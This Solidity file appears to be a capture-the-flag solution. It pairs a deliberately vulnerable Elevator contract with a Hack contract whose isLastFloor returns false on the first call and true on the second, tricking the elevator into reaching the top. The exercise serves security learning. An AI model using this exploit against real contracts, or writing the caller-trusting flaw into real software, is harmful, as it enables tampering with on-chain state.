// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Hack {
    function attack(Elevator _Attack) external {
        _Attack.goTo(1);
    }

    bool isTrue;

    function isLastFloor(uint) external returns (bool value) {
        if (isTrue) {
            value = true;
        } else {
            isTrue = true;
            value = false;
        }
    }
}
